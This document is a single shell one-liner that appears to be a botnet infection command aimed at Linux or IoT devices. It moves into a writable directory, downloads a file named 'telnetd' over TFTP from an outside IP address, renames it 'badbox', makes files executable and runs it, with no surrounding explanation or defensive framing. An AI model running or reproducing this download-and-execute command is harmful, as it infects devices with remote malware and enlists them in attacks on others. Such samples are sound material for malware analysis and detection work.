cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 172.104.149.119;cat telnetd >badbox;chmod +x *;./badbox
